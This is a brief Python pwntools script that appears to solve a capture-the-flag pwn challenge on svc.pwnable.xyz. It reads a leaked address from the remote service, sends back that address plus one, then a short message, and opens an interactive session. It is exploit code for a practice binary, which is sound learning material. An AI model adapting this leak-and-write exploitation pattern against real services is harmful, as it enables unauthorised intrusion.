#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./challenge',checksec=False)
#p = process()
p = remote('svc.pwnable.xyz',30000)
p.recvuntil(b': ')
leak = int(p.recvline().strip(),16)
print("leak: ",hex(leak))
input()
p.sendlineafter(b'message: ',str(leak+1))
p.sendafter(b'message: ',b'aaaaa')

p.interactive()
